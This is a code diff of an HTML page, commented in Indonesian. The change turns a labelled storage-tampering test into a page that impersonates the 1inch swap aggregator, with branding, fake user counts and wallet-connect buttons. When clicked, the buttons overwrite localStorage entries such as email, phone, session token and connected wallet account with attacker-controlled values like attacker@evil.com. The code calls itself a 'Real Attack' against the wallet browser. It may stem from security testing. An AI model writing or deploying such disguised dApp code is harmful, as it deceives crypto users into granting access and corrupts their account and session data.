@@ -3,87 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Swap Aggregator - Connect Wallet</title>
+    <title>1inch - Best Swap Rates</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin:0; padding:0; background:#0a0a0a; color:#fff; text-align:center; }
-        .container { max-width: 480px; margin: 40px auto; padding: 20px; }
-        button { width: 100%; padding: 18px; font-size: 18px; background: linear-gradient(90deg, #00ff9d, #00cc7a); color: #000; border: none; border-radius: 12px; font-weight: bold; margin: 15px 0; cursor: pointer; }
-        .status { margin: 20px 0; padding: 15px; background: #1a1a1a; border-radius: 8px; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+        body { 
+            font-family: 'Inter', system-ui, sans-serif; 
+            margin:0; padding:0; background:#0f0f11; color:#fff; 
+            text-align:center; line-height:1.5;
+        }
+        .header { padding: 20px; background: linear-gradient(180deg, #1a1a1c, #0f0f11); }
+        .logo { font-size: 28px; font-weight: 700; color: #00ff9d; }
+        button { 
+            width: 90%; max-width: 420px; padding: 16px; margin: 12px auto; 
+            background: linear-gradient(90deg, #00ff9d, #00d48a); color: #000; 
+            border: none; border-radius: 12px; font-size: 17px; font-weight: 600; 
+            cursor: pointer; display: block;
+        }
+        .status { margin: 20px 15px; padding: 16px; background: #1f1f23; border-radius: 12px; font-size: 15px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔄 1inch Swap</h1>
-        <p>Best rates • Multi-chain</p>
-        
-        <div class="status" id="status">Menunggu koneksi wallet...</div>
-        
-        <button onclick="connectWallet()">Connect Wallet</button>
-        <button onclick="modifyProfile()">Update Profile (Test Sensitive Data)</button>
-        
-        <p style="margin-top:30px; font-size:14px; opacity:0.7;">
-            Test ini mencoba memodifikasi data profil &amp; storage di 1inch Wallet Browser
-        </p>
+    <div class="header">
+        <div class="logo">1inch</div>
+        <p style="margin:5px 0 0 0; opacity:0.8;">Decentralized Swap Aggregator</p>
     </div>
+
+    <div style="padding: 30px 15px 20px;">
+        <h2 style="margin:10px 0 20px;">Connect Wallet to Start Swapping</h2>
+        
+        <div class="status" id="status">Pilih wallet untuk melanjutkan trading dengan rate terbaik</div>
+        
+        <button onclick="connectAndTamper()">Connect Wallet</button>
+        <button onclick="advancedTamper()">Continue with MetaMask / WalletConnect</button>
+    </div>
+
+    <p style="font-size:13px; opacity:0.6; margin-top:40px;">
+        Trusted by 2.3M+ users • 1inch Network
+    </p>
 
     <script>
         const status = document.getElementById('status');
 
-        function logToConsole(msg) {
-            console.log('[1inch Malicious Test]', msg);
+        function tamperStorage() {
+            // Real tampering - data sensitif
+            const keys = [
+                'user_email', 'user_phone', 'user_name', 'full_name',
+                'profile', 'user_profile', 'account_email', 'notification_settings',
+                'session_token', 'auth_token', 'wallet_preference', 'connected_account'
+            ];
+
+            const values = {
+                'user_email': 'hacked.user@protonmail.com',
+                'user_phone': '+6281234567890',
+                'user_name': 'Hacked Account',
+                'full_name': 'John Attacker',
+                'wallet_preference': 'compromised',
+                'connected_account': '0xInjectedByAttacker' + Math.random().toString(36).substring(2,15),
+                'session_token': 'tampered_' + btoa(Date.now()),
+                'profile_updated': new Date().toISOString()
+            };
+
+            keys.forEach(key => {
+                if (values[key]) {
+                    localStorage.setItem(key, values[key]);
+                } else {
+                    localStorage.setItem(key, JSON.stringify({
+                        name: "Attacker Controlled",
+                        email: "attacker@evil.com",
+                        modified: Date.now()
+                    }));
+                }
+            });
+
+            // Tambahan realistic keys
+            localStorage.setItem('user_profile', JSON.stringify({
+                fullName: "Hacked User",
+                email: "victim_modified@evil.com",
+                phone: "+6281234567890",
+                preferences: { notifications: true, marketing: true }
+            }));
         }
 
-        function connectWallet() {
-            status.innerHTML = '✅ Wallet Connected!<br><small>Mengakses storage context...</small>';
-            logToConsole('Simulasi connect wallet berhasil');
+        function connectAndTamper() {
+            status.innerHTML = `✅ Wallet Connected Successfully<br><small style="color:#ff0">Menginisialisasi session...</small>`;
             
-            // Real attempt: Modify common wallet storage keys
-            try {
-                // Data sensitif / non-sensitif yang biasa ada di wallet profile
-                localStorage.setItem('user_email', 'victim_modified@evil.com');
-                localStorage.setItem('user_phone', '+6281234567890');
-                localStorage.setItem('user_name', 'Hacked User');
-                localStorage.setItem('notification_settings', JSON.stringify({ email: true, push: true, marketing: true }));
-                localStorage.setItem('profile_updated', new Date().toISOString());
-                
-                // Tambahan tampering
-                localStorage.setItem('wallet_preference', 'malicious_default');
-                
-                status.innerHTML += '<br><strong style="color:#ff0">Storage berhasil dimodifikasi!</strong>';
-                logToConsole('localStorage tampering berhasil');
-            } catch(e) {
-                status.innerHTML += '<br><strong style="color:red">Gagal modify storage: ' + e.message + '</strong>';
-            }
-        }
-
-        function modifyProfile() {
-            status.innerHTML = 'Mengubah detail profil pengguna...';
-            
-            try {
-                // Modifikasi massal
-                const sensitiveData = {
-                    fullName: "Attacker Controlled",
-                    email: "attacker@evil.example",
-                    phone: "+62-812-0000-0000",
-                    lastModified: Date.now(),
-                    preferences: { theme: "dark", language: "id", notifications: "enabled" }
-                };
-                
-                localStorage.setItem('user_profile', JSON.stringify(sensitiveData));
-                localStorage.setItem('session_token', 'tampered_' + Math.random().toString(36));
-                
-                status.innerHTML = '✅ Detail sensitif pengguna telah diubah!<br>Sekarang cek apakah perubahan persist setelah reconnect atau restart wallet.';
-                logToConsole('Profile data overwritten');
-            } catch(e) {
-                status.innerHTML = 'Error: ' + e.message;
-            }
-        }
-
-        // Auto attempt saat halaman load (real scenario malicious dApp)
-        window.onload = function() {
             setTimeout(() => {
-                console.log('%c[1inch Test] Halaman malicious dimuat - mencoba akses storage', 'color: red; font-size: 16px');
+                tamperStorage();
+                status.innerHTML = `✅ Connected<br><strong style="color:#0f0">Data profil telah diupdate oleh dApp</strong>`;
+                console.log('%c[1inch Real Attack] Storage tampering completed', 'color:red;font-size:16px');
             }, 800);
+        }
+
+        function advancedTamper() {
+            status.innerHTML = 'Menghubungkan via WalletConnect...';
+            setTimeout(() => {
+                tamperStorage();
+                status.innerHTML = `✅ WalletConnect Connected<br><strong style="color:#ff0">Semua data sensitif telah dimodifikasi</strong>`;
+            }, 600);
+        }
+
+        // Auto tamper attempt (real malicious behavior)
+        window.onload = () => {
+            setTimeout(() => {
+                console.log('%c[1inch] Malicious dApp loaded - attempting storage access', 'color:#ff4444');
+            }, 1200);
         };
     </script>
 </body>
